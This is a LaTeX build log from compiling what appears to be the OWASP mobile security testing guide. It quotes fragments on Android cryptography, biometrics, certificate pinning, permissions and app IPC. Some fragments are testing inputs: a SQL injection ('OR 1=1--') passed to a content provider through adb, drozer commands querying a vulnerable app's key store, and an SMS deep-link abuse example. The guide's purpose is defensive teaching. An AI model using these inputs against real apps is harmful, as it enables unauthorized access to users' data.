rceCodePro(6)/m/n/10.95 /data/system/<IMAGE_FOLDER_NAME>
[341] [342] [343] [344] [345] [346] [347]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/e9acff65016bb9e041e6fed3ec844f8e4df0cae9.
png" > [348]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/5714378441f6a767b5bf09078d621a244d4d9fc2.
png" > [349] [350] [351]
Underfull \hbox (badness 10000) in paragraph at lines 20219--20222
[]\TU/SourceSansPro(0)/m/n/10.95 Memory Monitor - [][]$[][][][] [] [] [] [][][]
[][][][][][] [] [][][][][][][] [] [][][] [] [][][][][] [] [][][][][][][][][] []
 [][][][][][][][][] [][] [][][][][][] [] [][][][] []
[352]
Underfull \hbox (badness 1112) in paragraph at lines 20281--20290
[]\TU/SourceSansPro(0)/m/n/10.95 Android cryptography APIs are based on the Jav
a Cryptography Architecture (JCA). JCA separates
[353]
Underfull \hbox (badness 1540) in paragraph at lines 20364--20373
[]\TU/SourceSansPro(0)/m/n/10.95 Conscrypt, known as \TU/SourceCodePro(6)/m/n/1
0.95 AndroidOpenSSL\TU/SourceSansPro(0)/m/n/10.95 , is preferred above using Bo
uncy Castle and

Underfull \hbox (badness 2042) in paragraph at lines 20364--20373
\TU/SourceSansPro(0)/m/n/10.95 it has new implementations: \TU/SourceCodePro(6)
/m/n/10.95 AlgorithmParameters:GCM \TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceC
odePro(6)/m/n/10.95 KeyGenerator:AES\TU/SourceSansPro(0)/m/n/10.95 ,

Underfull \hbox (badness 10000) in paragraph at lines 20364--20373
\TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:DESEDE\TU/SourceSansPro(0)/m/n/10.9
5 , \TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACMD5\TU/SourceSansPro(0)/m/n
/10.95 , \TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACSHA1\TU/SourceSansPro(
0)/m/n/10.95 ,

Overfull \hbox (45.35818pt too wide) in paragraph at lines 20364--20373
\TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACSHA224\TU/SourceSansPro(0)/m/n/
10.95 , \TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACSHA256\TU/SourceSansPro
(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACSHA384\TU/Sourc
eSansPro(0)/m/n/10.95 ,

Overfull \hbox (63.71037pt too wide) in paragraph at lines 20364--20373
\TU/SourceCodePro(6)/m/n/10.95 KeyGenerator:HMACSHA512\TU/SourceSansPro(0)/m/n/
10.95 , \TU/SourceCodePro(6)/m/n/10.95 SecretKeyFactory:DESEDE\TU/SourceSansPro
(0)/m/n/10.95 , and \TU/SourceCodePro(6)/m/n/10.95 Signature:NONEWITHECDSA\TU/S
ourceSansPro(0)/m/n/10.95 . 

Underfull \hbox (badness 2990) in paragraph at lines 20373--20376
[]\TU/SourceSansPro(0)/m/n/10.95 You should not use the \TU/SourceCodePro(6)/m/
n/10.95 IvParameterSpec.class \TU/SourceSansPro(0)/m/n/10.95 anymore for GCM, b
ut use the

Overfull \hbox (22.53477pt too wide) in paragraph at lines 20376--20380
[]\TU/SourceSansPro(0)/m/n/10.95 Sockets have changed from \TU/SourceCodePro(6)
/m/n/10.95 OpenSSLSocketImpl \TU/SourceSansPro(0)/m/n/10.95 to \TU/SourceCodePr
o(6)/m/n/10.95 ConscryptFileDescriptorSocket\TU/SourceSansPro(0)/m/n/10.95 ,

Overfull \hbox (50.72498pt too wide) in paragraph at lines 20400--20402
[]\TU/SourceSansPro(0)/m/n/10.95 The \TU/SourceCodePro(6)/m/n/10.95 Crypto \TU/
SourceSansPro(0)/m/n/10.95 security provider is now removed. Calling it will re
sult in a \TU/SourceCodePro(6)/m/n/10.95 NoSuchProviderException\TU/SourceSansP
ro(0)/m/n/10.95 . 
[354]
Underfull \hbox (badness 5260) in paragraph at lines 20426--20429
[]\TU/SourceSansPro(0)/m/n/10.95 You should stop specifying a security provider
 and use the default implementation (An-
[355]
Overfull \hbox (40.79941pt too wide) in paragraph at lines 20487--20487
[]\TU/SourceCodePro(6)/m/n/10.95 provider: Crypto1.0 (HARMONY (SHA1 digest; Sec
ureRandom; SHA1withDSA signature))[] 

Overfull \hbox (42.98943pt too wide) in paragraph at lines 20500--20500
[]\TU/SourceCodePro(6)/m/n/10.95 provider: CertPathProvider 1.0(Provider of Cer
tPathBuilder and CertPathVerifier)[] 

Overfull \hbox (205.04938pt too wide) in paragraph at lines 20500--20500
[]\TU/SourceCodePro(6)/m/n/10.95 provider: AndroidKeyStoreBCWorkaround 1.0(Andr
oid KeyStore security provider to work around Bouncy Castle)[] 

Underfull \hbox (badness 1924) in paragraph at lines 20506--20513
[]\TU/SourceSansPro(0)/m/n/10.95 Keeping up-to-date and patched component is on
e of security principles. The same applies to
[356]
Underfull \hbox (badness 1082) in paragraph at lines 20562--20570
[]\TU/SourceSansPro(0)/m/n/10.95 The \TU/SourceCodePro(6)/m/n/10.95 KeyGenParam
eterSpec \TU/SourceSansPro(0)/m/n/10.95 indicates that the key can be used for 
encryption and decryption,
[357]
Underfull \hbox (badness 3849) in paragraph at lines 20627--20630
[]\TU/SourceSansPro(0)/m/n/10.95 Since the IV is randomly generated each time, 
it should be saved along with the cipher text
[358] [359] [360]
Underfull \hbox (badness 1264) in paragraph at lines 20797--20800
[]\TU/SourceSansPro(0)/m/n/10.95 classes which uses \TU/SourceCodePro(6)/m/n/10
.95 java.security.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10
.95 javax.crypto.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.
95 android.security.* \TU/SourceSansPro(0)/m/n/10.95 and
[361]
Overfull \hbox (17.84456pt too wide) in paragraph at lines 20894--20897
[]\TU/SourceSansPro(0)/m/n/10.95 exceptions \TU/SourceCodePro(6)/m/n/10.95 KeyS
toreException\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 Ce
rtificateException\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.
95 NoSuchAlgorithmException 

Underfull \hbox (badness 1264) in paragraph at lines 20897--20900
[]\TU/SourceSansPro(0)/m/n/10.95 classes which uses \TU/SourceCodePro(6)/m/n/10
.95 java.security.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10
.95 javax.crypto.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.
95 android.security.* \TU/SourceSansPro(0)/m/n/10.95 and
[362]
Overfull \hbox (17.84456pt too wide) in paragraph at lines 20965--20968
[]\TU/SourceSansPro(0)/m/n/10.95 exceptions \TU/SourceCodePro(6)/m/n/10.95 KeyS
toreException\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 Ce
rtificateException\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.
95 NoSuchAlgorithmException 

Underfull \hbox (badness 1264) in paragraph at lines 20968--20971
[]\TU/SourceSansPro(0)/m/n/10.95 classes which uses \TU/SourceCodePro(6)/m/n/10
.95 java.security.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10
.95 javax.crypto.*\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.
95 android.security.* \TU/SourceSansPro(0)/m/n/10.95 and
[363] [364] [365]
Underfull \hbox (badness 2781) in paragraph at lines 21148--21151
[]\TU/SourceSansPro(0)/m/n/10.95 Android Developer blog: Cryptography Changes i
n Android P - [][]$[][][][][] [] [] [] [][][][][][][] [][] [][][][][][][][][][]
 []

Underfull \hbox (badness 10000) in paragraph at lines 21179--21182
[]\TU/SourceSansPro(0)/m/n/10.95 Burpproxy its Sequencer - [][]$[][][][][] [] [
] [] [][][][][][][][][][][] [] [][][] [] [][][][] [] [][][][][][][][][][][][][]
 [] [][][][][][][] [] [][][][][] []
[366]
Underfull \hbox (badness 3118) in paragraph at lines 21205--21208
[]\TU/SourceSansPro(0)/m/n/10.95 KeyInfo Documentation - [][]$[][][][][] [] [] 
[] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][][] [] [][]
[][][][][] [] [][][][][][][][] [] [][][][][][][][] []

Overfull \hbox (10.94618pt too wide) in paragraph at lines 21208--21210
[]\TU/SourceSansPro(0)/m/n/10.95 SharedPreferences - [][]$[][][][][] [] [] [] [
][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][][] [] [][][][]
[][][] [] [][][][][][][] [] [][][][][][][][][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 21219--21222
[]\TU/SourceSansPro(0)/m/n/10.95 Android Key Attestation - [][]$[][][][][] [] [
] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][] [] [][]
[][][][][][] [] [][][][][][][][] [][] [][][] [][]

Overfull \hbox (14.96843pt too wide) in paragraph at lines 21222--21225
[]\TU/SourceSansPro(0)/m/n/10.95 Attestation and Assertion - [][]$[][][][][] []
 [] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][] [][] [][] [] [][]
[][] [] [][][] [] [][][] [] [][][] [] [][][][][][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 21228--21231
[]\TU/SourceSansPro(0)/m/n/10.95 FIDO Alliance Whitepaper - [][]$[][][][][] [] 
[] [] [][][][][][][][][][][][] [] [][][] [] [][] [][] [][][][][][][] [] [][][][
][][][] [] [][][][][][][][] [][] [][][][][][] []
[367]
Underfull \hbox (badness 2359) in paragraph at lines 21303--21311
\TU/SourceSansPro(0)/m/n/10.95 (\TU/SourceCodePro(6)/m/n/10.95 setUserAuthentic
ationValidityDurationSeconds\TU/SourceSansPro(0)/m/n/10.95 ), otherwise the dev
ice needs to be
[368] [369]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/190c3e989709cec2b899e4a0ad6740fff69ed529.
png" >
Overfull \hbox (2.65039pt too wide) in paragraph at lines 21449--21451
[][]\TU/SourceSansPro(0)/m/n/10.95 {
[370]
Underfull \hbox (badness 2181) in paragraph at lines 21476--21488
[]\TU/SourceSansPro(0)/m/n/10.95 Android 6.0 (API level 23) introduced public A
PIs for authenticating users via fingerprint, but is

Underfull \hbox (badness 1454) in paragraph at lines 21476--21488
[][]\TU/SourceCodePro(6)/m/n/10.95 FingerprintManager[][] \TU/SourceSansPro(0)/
m/n/10.95 class. An app can request fingerprint authentication by instantiating
 a
[371]
Underfull \hbox (badness 5203) in paragraph at lines 21489--21500
[]\TU/SourceSansPro(0)/m/n/10.95 You can achieve better security by using the f
ingerprint API in conjunction with the Android

Overfull \hbox (27.9417pt too wide) in paragraph at lines 21489--21500
\TU/SourceSansPro(0)/m/n/10.95 created which encrypts the authentication token.
 By calling \TU/SourceCodePro(6)/m/n/10.95 setUserAuthenticationRequired(true)

Overfull \hbox (8.29257pt too wide) in paragraph at lines 21520--21525
[]\TU/SourceSansPro(0)/m/n/10.95 Android provides a library called [][]Biometri
c[][] which offers a compatibility version of the \TU/SourceCodePro(6)/m/n/10.9
5 BiometricPrompt

Underfull \hbox (badness 4132) in paragraph at lines 21542--21548
[]\TU/SourceSansPro(0)/m/n/10.95 The app creates a key in the KeyStore with \TU
/SourceCodePro(6)/m/n/10.95 setUserAuthenticationRequired \TU/SourceSansPro(0)/
m/n/10.95 and

Overfull \hbox (187.99045pt too wide) in paragraph at lines 21542--21548
\TU/SourceCodePro(6)/m/n/10.95 setInvalidatedByBiometricEnrollment \TU/SourceSa
nsPro(0)/m/n/10.95 set to true. Additionally, \TU/SourceCodePro(6)/m/n/10.95 se
tUserAuthenticationValidityDurationSeconds
[372]
Overfull \hbox (26.05118pt too wide) in paragraph at lines 21573--21580
[]\TU/SourceSansPro(0)/m/n/10.95 This section describes how to implement biomet
ric authentication by using the \TU/SourceCodePro(6)/m/n/10.95 FingerprintManag
er

Overfull \hbox (107.51051pt too wide) in paragraph at lines 21590--21596
\TU/SourceSansPro(0)/m/n/10.95 Verify the key was both created using the \TU/So
urceCodePro(6)/m/n/10.95 KeyGenerator \TU/SourceSansPro(0)/m/n/10.95 class in a
ddition to \TU/SourceCodePro(6)/m/n/10.95 setUserAuthenticationRequired(true)
[373]
Overfull \hbox (31.10501pt too wide) in paragraph at lines 21683--21687
\TU/SourceSansPro(0)/m/n/10.95 class by adding \TU/SourceCodePro(6)/m/n/10.95 s
etUserAuthenticationRequired(true) \TU/SourceSansPro(0)/m/n/10.95 in \TU/Source
CodePro(6)/m/n/10.95 KeyGenParameterSpec.Builder\TU/SourceSansPro(0)/m/n/10.95 
. 
[374]
Underfull \hbox (badness 1590) in paragraph at lines 21716--21721
[]\TU/SourceSansPro(0)/m/n/10.95 Keep in mind, a new key cannot be used immedia
tely - it has to be authenticated through the

Overfull \hbox (88.67403pt too wide) in paragraph at lines 21716--21721
\TU/SourceCodePro(6)/m/n/10.95 FingerprintManager \TU/SourceSansPro(0)/m/n/10.9
5 first. This involves wrapping the \TU/SourceCodePro(6)/m/n/10.95 Cipher \TU/S
ourceSansPro(0)/m/n/10.95 object into \TU/SourceCodePro(6)/m/n/10.95 Fingerprin
tManager.CryptoObject

Overfull \hbox (209.41478pt too wide) in paragraph at lines 21729--21733
[]\TU/SourceSansPro(0)/m/n/10.95 When the authentication succeeds, the callback
 method \TU/SourceCodePro(6)/m/n/10.95 onAuthenticationSucceeded(FingerprintMan
ager.AuthenticationResult
[375]
Underfull \hbox (badness 2229) in paragraph at lines 21772--21774
[]\TU/SourceSansPro(0)/m/n/10.95 To use the key for signing, you need to instan
tiate a CryptoObject and authenticate it through

Underfull \hbox (badness 3724) in paragraph at lines 21809--21811
[]\TU/SourceSansPro(0)/m/n/10.95 To implement authentication using symmetric fi
ngerprint authentication, use a challenge-

Underfull \hbox (badness 6575) in paragraph at lines 21817--21825
[]\TU/SourceSansPro(0)/m/n/10.95 Android 7.0 (API level 24) adds the \TU/Source
CodePro(6)/m/n/10.95 setInvalidatedByBiometricEnrollment(boolean
[376] [377]
Underfull \hbox (badness 1168) in paragraph at lines 21938--21945
[]\TU/SourceSansPro(0)/m/n/10.95 Make sure that the hostname and the certificat
e itself are verified correctly. Examples and com-

Overfull \hbox (37.4933pt too wide) in paragraph at lines 21947--21950
[]\TU/SourceSansPro(0)/m/n/10.95 Note that from Android 8.0 (API level 26) onwa
rd, there is no support for SSLv3 and \TU/SourceCodePro(6)/m/n/10.95 HttpsURLCo
nnection
[378]
Overfull \hbox (8.11008pt too wide) in paragraph at lines 21973--21979
\TU/SourceSansPro(0)/m/n/10.95 writing the functions \TU/SourceCodePro(6)/m/n/1
0.95 checkClientTrusted\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/
n/10.95 checkServerTrusted\TU/SourceSansPro(0)/m/n/10.95 , and \TU/SourceCodePr
o(6)/m/n/10.95 getAcceptedIssuers\TU/SourceSansPro(0)/m/n/10.95 .
[379] [380] [381] [382]
Underfull \hbox (badness 4467) in paragraph at lines 22221--22224
[]\TU/SourceSansPro(0)/m/n/10.95 First, find the Network Security Configuration
 file in the Android application manifest via the
[383]
Overfull \hbox (119.63937pt too wide) in paragraph at lines 22271--22271
[]\TU/SourceCodePro(6)/m/n/10.95 D/NetworkSecurityConfig: Using Network Securit
y Config from resource network_security_config[] 

Overfull \hbox (60.50938pt too wide) in paragraph at lines 22278--22278
[]\TU/SourceCodePro(6)/m/n/10.95 I/X509Util: Failed to validate the certificate
 chain, error: Pin verification failed[] 
[384] [385]
Overfull \hbox (2859.5245pt too wide) in paragraph at lines 22396--22396
[]\TU/SourceCodePro(6)/m/n/10 "3082010A02820101009CD30CF05AE52E47B7725D3783B368
6330EAD735261925E1BDBE35F170922FB7B84B4105ABA99E350858ECB12AC468870BA3E375E4E6F
3A76271BA7981601FD7919A9FF3D0786771C8690E9591CFFEE699E9603C48CC7ECA4D7712249D47
1B5AEBB9EC1E37001C9CAC7BA705EACE4AEBBD41E53698B9CBFD6D3C9668DF232A42900C867467C
87FA59AB8526114133F65E98287CBDBFA0E56F68689F3853F9786AFB0DC1AEF6B0D95167DC42BA0
65B299043675806BAC4AF31B9049782FA2964F2A20252904C674C0D031CD8F31389516BAA833B84
3F1B11FC3307FA27931133D2D36F8E3FCF2336AB93931C5AFC48D0D1D641633AAFA8429B6D40BC0
D87DC3930203010001"[];|  

Overfull \hbox (3.5245pt too wide) in paragraph at lines 22405--22405
\TU/SourceCodePro(6)/m/it/10 ning",chain.ChainElements[X].Certificate.GetPublic
KeyString());[]|  
[386] [387] [388]
Overfull \hbox (1159.88916pt too wide) in paragraph at lines 22579--22579
[]\TU/SourceCodePro(6)/m/n/10.95 $ keytool -importcert -v -trustcacerts -file p
roxy.cer -alias aliascert -keystore "res/raw/truststore.bks" -provider org.boun
cycastle.jce.provider.BouncyCastleProvider -providerpath "providerpath/bcprov-j
dk15on-164.jar" -storetype BKS -storepass password[] 

Overfull \hbox (809.48923pt too wide) in paragraph at lines 22585--22585
[]\TU/SourceCodePro(6)/m/n/10.95 $ keytool -list -keystore "res/raw/truststore.
bks" -provider org.bouncycastle.jce.provider.BouncyCastleProvider -providerpath
 "providerpath/bcprov-jdk15on-164.jar"  -storetype BKS -storepass password[] 
[389] [390]
Underfull \hbox (badness 4634) in paragraph at lines 22714--22722
\TU/SourceSansPro(0)/m/n/10.95 entry or in a parent \TU/SourceCodePro(6)/m/n/10
.95 <domain-config\>\TU/SourceSansPro(0)/m/n/10.95 , the configurations in plac
e will be based on the
[391] [392] [393] [394] [395]
Overfull \hbox (24.08975pt too wide) in paragraph at lines 22999--23004
[]\TU/SourceSansPro(0)/m/n/10.95 Use Xposed to hook into the \TU/SourceCodePro(
6)/m/n/10.95 java.security \TU/SourceSansPro(0)/m/n/10.95 package, then hook in
to \TU/SourceCodePro(6)/m/n/10.95 java.security.Security
[396]
Underfull \hbox (badness 10000) in paragraph at lines 23043--23045
[]\TU/SourceSansPro(0)/m/n/10.95 Network Security Config (cached alternative) -
 [][]$[][][][][] [] [] [] [][][][][][][][] [] [][][][][][][][][][][][][][][][][
] [] [][][] []

Underfull \hbox (badness 10000) in paragraph at lines 23043--23045
[][][][][][] [] [] [] [][][][][] [] [][][][][][][][][][][][] [] [][][][][] [] [
] [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][] [] [][]
[][][][][][] [] [][][][][][][][] [][]

Underfull \hbox (badness 2237) in paragraph at lines 23054--23057
[]\TU/SourceSansPro(0)/m/n/10.95 Certificate and Public Key Pinning with Xamari
n - [][]$[][][][][] [] [] [] [][][][][][][][][][][] [] [][][] [] [][][][][][][]
[][][][] [][] [][][] [][]

Overfull \hbox (22.34132pt too wide) in paragraph at lines 23057--23059
[]\TU/SourceSansPro(0)/m/n/10.95 ServicePointManager - [][]$[][][][][] [] [] []
 [][][][] [] [][][][][][][][][] [] [][][] [] [][] [][] [][] [] [][][][][][][] [
] [][][][][][] [] [][][] [] [][][][][][][][][][][][][][][][][][][][][] []

Overfull \hbox (22.69469pt too wide) in paragraph at lines 23068--23070
[]\TU/SourceSansPro(0)/m/n/10.95 PhoneGap SSL Certificate Checker plugin - [][]
$[][][][][] [] [] [] [][][][][][] [] [][][] [] [][][][][][][][][][][][][][] [] 
[][][][][][][][][][][][][][][][][][][][][] [][]
[397] [398]
Underfull \hbox (badness 1394) in paragraph at lines 23174--23188
[]\TU/SourceSansPro(0)/bx/n/10.95 Restrictions when granting dangerous permissi
ons\TU/SourceSansPro(0)/m/n/10.95 : Dangerous permissions are classified

Underfull \hbox (badness 1968) in paragraph at lines 23190--23199
[]\TU/SourceSansPro(0)/m/n/10.95 Suppose an app lists both READ_EXTERNAL_STORAG
E and WRITE_EXTERNAL_STORAGE

Underfull \hbox (badness 1715) in paragraph at lines 23190--23199
\TU/SourceSansPro(0)/m/n/10.95 at the same time, because it belongs to the same
 STORAGE permission group and is

Underfull \hbox (badness 1097) in paragraph at lines 23190--23199
\TU/SourceSansPro(0)/m/n/10.95 grants only READ_EXTERNAL_STORAGE at that time; 
however, if the app later requests

Overfull \hbox (45.5809pt too wide) in paragraph at lines 23224--23231
[]\TU/SourceSansPro(0)/bx/n/10.95 Restricted access to call logs\TU/SourceSansP
ro(0)/m/n/10.95 : \TU/SourceCodePro(6)/m/n/10.95 READ_CALL_LOG\TU/SourceSansPro
(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 WRITE_CALL_LOG\TU/SourceSansPro(
0)/m/n/10.95 , and \TU/SourceCodePro(6)/m/n/10.95 PROCESS_OUTGOING_CALLS
[399]
Underfull \hbox (badness 1303) in paragraph at lines 23307--23314
\TU/SourceSansPro(0)/m/n/10.95 ifest restrict who can start or bind to the asso
ciated Service. The permission is checked during
[400]
Underfull \hbox (badness 3803) in paragraph at lines 23355--23362
\TU/SourceCodePro(6)/m/n/10.95 ContentResolver.insert\TU/SourceSansPro(0)/m/n/1
0.95 , \TU/SourceCodePro(6)/m/n/10.95 ContentResolver.update\TU/SourceSansPro(0
)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 ContentResolver.delete \TU/SourceS
ansPro(0)/m/n/10.95 re-

Overfull \hbox (72.93692pt too wide) in paragraph at lines 23373--23379
\TU/SourceSansPro(0)/m/n/10.95 set \TU/SourceCodePro(6)/m/n/10.95 Intent.FLAG_G
RANT_READ_URI_PERMISSION \TU/SourceSansPro(0)/m/n/10.95 and/or \TU/SourceCodePr
o(6)/m/n/10.95 Intent.FLAG_GRANT_WRITE_URI_PERMISSION\TU/SourceSansPro(0)/m/n/1
0.95 .
[401]
Underfull \hbox (badness 3439) in paragraph at lines 23406--23413
[]\TU/SourceSansPro(0)/m/n/10.95 Android allows apps to expose their services/c
omponents to other apps. Custom permissions

Underfull \hbox (badness 1308) in paragraph at lines 23406--23413
\TU/SourceSansPro(0)/m/n/10.95 are required for app access to the exposed compo
nents. You can define [][]custom permissions[][] in

Overfull \hbox (4.86523pt too wide) in paragraph at lines 23406--23413
\TU/SourceCodePro(6)/m/n/10.95 AndroidManifest.xml \TU/SourceSansPro(0)/m/n/10.
95 by creating a permission tag with two mandatory attributes: \TU/SourceCodePr
o(6)/m/n/10.95 android:name
[402]
Underfull \hbox (badness 3701) in paragraph at lines 23450--23462
[]\TU/SourceSansPro(0)/m/n/10.95 Once the permission \TU/SourceCodePro(6)/m/n/1
0.95 START_MAIN_ACTIVITY \TU/SourceSansPro(0)/m/n/10.95 has been created, apps 
can request it via the

Underfull \hbox (badness 1371) in paragraph at lines 23450--23462
\TU/SourceCodePro(6)/m/n/10.95 uses-permission \TU/SourceSansPro(0)/m/n/10.95 t
ag in the \TU/SourceCodePro(6)/m/n/10.95 AndroidManifest.xml \TU/SourceSansPro(
0)/m/n/10.95 file. Any application granted the cus-

Underfull \hbox (badness 3769) in paragraph at lines 23450--23462
\TU/SourceSansPro(0)/m/n/10.95 tom permission \TU/SourceCodePro(6)/m/n/10.95 ST
ART_MAIN_ACTIVITY \TU/SourceSansPro(0)/m/n/10.95 can then launch the \TU/Source
CodePro(6)/m/n/10.95 TEST_ACTIVITY\TU/SourceSansPro(0)/m/n/10.95 . Please note
[403] [404]
Underfull \hbox (badness 1859) in paragraph at lines 23577--23585
\TU/SourceSansPro(0)/m/n/10.95 missions programmatically. This is not recommend
ed, however, because it is more error-prone
[405] [406] [407] [408]
Overfull \hbox (56.13431pt too wide) in paragraph at lines 23763--23767
\TU/SourceSansPro(0)/m/n/10.95 essary for the app. For instance: a single-playe
r game that requires access to \TU/SourceCodePro(6)/m/n/10.95 android.permissio
n.WRITE_SMS\TU/SourceSansPro(0)/m/n/10.95 ,

Overfull \hbox (3.5245pt too wide) in paragraph at lines 23821--23821
\TU/SourceCodePro(6)/m/n/10 droid:name=[][]".OMTG_CODING_003_SQL_Injection_Cont
ent_Provider_Implementation"[]|  
[409]
Overfull \hbox (160.94403pt too wide) in paragraph at lines 23827--23832
\TU/SourceSansPro(0)/m/n/10.95 to all other apps. The \TU/SourceCodePro(6)/m/n/
10.95 query \TU/SourceSansPro(0)/m/n/10.95 function in the \TU/SourceCodePro(6)
/m/n/10.95 OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation.java
[410]
Overfull \hbox (82.99635pt too wide) in paragraph at lines 23872--23880
[]\TU/SourceSansPro(0)/m/n/10.95 While the user is providing a STUDENT_ID at \T
U/SourceCodePro(6)/m/n/10.95 content://sg.vp.owasp_mobile.provider.College/stud
ents\TU/SourceSansPro(0)/m/n/10.95 ,

Overfull \hbox (21.0894pt too wide) in paragraph at lines 23925--23925
[]\TU/SourceCodePro(6)/m/n/10.95 # content query --uri content://sg.vp.owasp_mo
bile.provider.College/students[] 

Overfull \hbox (229.1393pt too wide) in paragraph at lines 23932--23932
[]\TU/SourceCodePro(6)/m/n/10.95 # content query --uri content://sg.vp.owasp_mo
bile.provider.College/students --where "name=[]Bob[]) OR 1=1--[][]"[] 
[411]
Overfull \hbox (271.57433pt too wide) in paragraph at lines 23948--23954
[]\TU/SourceSansPro(0)/m/n/10.95 This abstract class parses the extra data fiel
ds of an Intent, in particular, the \TU/SourceCodePro(6)/m/n/10.95 PreferenceAc
tivity.EXTRA_SHOW_FRAGMENT(:android:show_fragment)

Overfull \hbox (88.31508pt too wide) in paragraph at lines 23948--23954
\TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCodePro(6)/m/n/10.95 PreferenceAct
ivity.EXTRA_SHOW_FRAGMENT_ARGUMENTS(:android:show_fragment_arguments)
[412] [413]
Overfull \hbox (64.52951pt too wide) in paragraph at lines 24076--24076
| | | |\TU/SourceCodePro(6)/m/n/10 i.[]setClassName[]([]"pt.claudio.insecurefra
gment"[],[]"pt.claudio.insecurefragment.MainActivity"[]);|  

Overfull \hbox (187.09499pt too wide) in paragraph at lines 24102--24107
[]\TU/SourceSansPro(0)/m/n/10.95 Consider this contrived example: \TU/SourceCod
ePro(6)/m/n/10.95 sms://compose/to=your.boss@company.com&message=I%20QUIT!&send
Immediately=true\TU/SourceSansPro(0)/m/n/10.95 .

Underfull \hbox (badness 1072) in paragraph at lines 24122--24131
\TU/SourceSansPro(0)/m/n/10.95 mobile app via a link, which isn’t inherently ri
sky. Alternatively, since Android 6.0 (API level 23)
[414]
Underfull \hbox (badness 3907) in paragraph at lines 24175--24179
[]\TU/SourceSansPro(0)/m/n/10.95 Data can then be transmitted through this new 
scheme with, for example, the following URI:

Underfull \hbox (badness 10000) in paragraph at lines 24175--24179
\TU/SourceCodePro(6)/m/n/10.95 myapp://path/to/what/i/want?keyOne=valueOne&keyT
wo=valueTwo\TU/SourceSansPro(0)/m/n/10.95 . Code like
[415]
Overfull \hbox (47.36942pt too wide) in paragraph at lines 24209--24209
[]    \TU/SourceCodePro(6)/m/n/10.95 com.google.android.apps.messaging.ui.conve
rsation.LaunchConversationActivity[] 

Overfull \hbox (126.2094pt too wide) in paragraph at lines 24216--24216
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.activity.start  --action android.i
ntent.action.VIEW --data-uri "sms://0123456789"[] 
[416]
Overfull \hbox (32.0394pt too wide) in paragraph at lines 24312--24312
[]\TU/SourceCodePro(6)/m/n/10.95 $ cd path/to/android/sdk/tools/bin && ./sdkman
ager []extras;google;instantapps[][] 

Underfull \hbox (badness 1383) in paragraph at lines 24314--24317
[]\TU/SourceSansPro(0)/m/n/10.95 Next, you have to add \TU/SourceCodePro(6)/m/n
/10.95 path/to/android/sdk/extras/google/instantapps/ia \TU/SourceSansPro(0)/m/
n/10.95 to your
[417]
Underfull \hbox (badness 1394) in paragraph at lines 24420--24433
\TU/SourceSansPro(0)/m/n/10.95 ways to designate a component as exported. The o
bvious one is setting the export tag to true
[418] [419]
Overfull \hbox (147.5245pt too wide) in paragraph at lines 24535--24535
\TU/SourceCodePro(6)/m/n/10 vice.[]this[].[]setKey[](returnBundle.[]getString[]
([]"com.mwr.example.sieve.PASSWORD"[]))) 
[420]
Overfull \hbox (117.5245pt too wide) in paragraph at lines 24542--24542
\TU/SourceCodePro(6)/m/n/10 vice.[]this[].[]setPin[](returnBundle.[]getString[]
([]"com.mwr.example.sieve.PIN"[]))) 

Underfull \hbox (badness 1888) in paragraph at lines 24563--24565
[]\TU/SourceSansPro(0)/m/n/10.95 In the “Android Insecure Bank” app, we find a 
broadcast receiver in the manifest, identified by

Underfull \hbox (badness 10000) in paragraph at lines 24579--24582
[]\TU/SourceSansPro(0)/m/n/10.95 Search the source code for strings like \TU/So
urceCodePro(6)/m/n/10.95 sendBroadcast\TU/SourceSansPro(0)/m/n/10.95 , \TU/Sour
ceCodePro(6)/m/n/10.95 sendOrderedBroadcast\TU/SourceSansPro(0)/m/n/10.95 , and

[421]
Underfull \hbox (badness 1546) in paragraph at lines 24588--24593
\TU/SourceSansPro(0)/m/n/10.95 analysis and search for usage of the class \TU/S
ourceCodePro(6)/m/n/10.95 android.content.BroadcastReceiver \TU/SourceSansPro(0
)/m/n/10.95 and the
[422] [423]
Overfull \hbox (56.1294pt too wide) in paragraph at lines 24686--24686
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Keys[] 

Overfull \hbox (923.36919pt too wide) in paragraph at lines 24686--24686
[]\TU/SourceCodePro(6)/m/n/10.95 Permission Denial: reading com.mwr.example.sie
ve.DBContentProvider uri content://com.mwr.example.sieve.DBContentProvider/Keys
 from pid=4268, uid=10054 requires com.mwr.example.sieve.READ_KEYS, or grantUri
Permission()[] 

